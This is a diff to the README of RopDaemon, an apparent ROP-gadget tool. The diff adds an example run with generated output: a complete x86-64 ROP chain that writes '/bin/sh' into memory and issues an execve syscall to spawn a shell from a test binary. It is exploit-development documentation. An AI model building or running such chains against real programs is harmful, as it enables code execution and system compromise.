@@ -68,7 +68,45 @@ optional arguments:
   --stats        statistics about verified gadgets
 ```
 
-* Run `ropd -cv <binary>` to collect, verify the gadgets in `<binary>`.
-  Collection and Verification phase have to be run once per binary. `RopDaemon` will create a `<binary>.collected` and `<binary>.verified` file to cache the results.
+* Run `ropd -cv <binary>` to collect and verify the gadgets in `<binary>`.
+  Collection and Verification phases have to be run just once per binary. `RopDaemon` will create a `<binary>.collected` and `<binary>.verified` file to cache the results.
 * Run `ropd -j <binary>` to dump a `json` file with all the verified gadgets for `<binary>`.
 * Run `ropd -e <binary>` to produce an `execve("/bin/sh")` chain from `<binary>`.
+
+### Example
+
+``` shell
+$ ropd -cve test/baby_stack
+Collecting...
+Analyzing...
+100%|██████████████████████| 12314/12314 [00:33<00:00, 366.67it/s]
+Found 2318 different typed gadgets
+Collected gadgets saved in test/baby_stack.collected
+Verifying...
+100%|██████████████████████| 2055/2055 [00:21<00:00, 96.91it/s]
+Found 1841 different verified gadgets
+Verified gadgets saved in test/baby_stack.verified
+[+] found best guesses for: ['rax', 'rcx', 'rsi', 'rbp', 'rbx', 'rdx', 'rdi']
+[+] computing sequence
+
+IMAGE_BASE =  0x0
+rebase = lambda x : p64(x + IMAGE_BASE)
+
+rop = ''
+rop += rebase(0x4016ea) # pop rax; ret
+rop += p64(0x5a6830)
+rop += rebase(0x409d68) # pop rbx; and byte ptr [rax + 1], cl; ret
+rop += p64(0x5bf058)
+rop += rebase(0x43730f) # pop rbp; ret
+rop += p64(0x68732f6e69622f) # "/bin/sh\x00"
+rop += rebase(0x40631a) # mov qword ptr [rbx], rbp; ret
+rop += rebase(0x470931) # pop rdi; or byte ptr [rax + 0x39], cl; ret
+rop += p64(0x5bf058)
+rop += rebase(0x46ec93) # pop rdx; adc byte ptr [rax - 1], cl; ret
+rop += p64(0x0)
+rop += rebase(0x4016ea) # pop rax; ret
+rop += p64(0x3b)
+rop += rebase(0x46defd) # pop rsi; ret
+rop += p64(0x0)
+rop += rebase(0x456889) # syscall ; ret
+```
